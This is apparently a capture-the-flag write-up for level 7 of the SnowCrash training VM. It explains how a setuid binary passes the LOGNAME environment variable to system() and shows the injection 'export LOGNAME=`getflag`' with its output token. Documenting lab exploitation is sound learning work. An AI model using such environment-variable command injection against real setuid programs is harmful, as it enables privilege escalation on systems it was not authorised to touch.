# LEVEL 7

First we reverse the binary to understand the general control flow of the program
- Setuid/gid (! important, thats what allow us to execute higher level command on our code injection) 
- got content from env var LOGNAME
- Then sent it to asprintf with %s to write it to str
- Then printed it with system /bin/echo str
- We needed str to evaluate to getflag since system was launching it

#### we simply do a code injection via the environnement variable :

```
export LOGNAME=\`getflag\`
./level07
```
```
level07@SnowCrash:~$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```
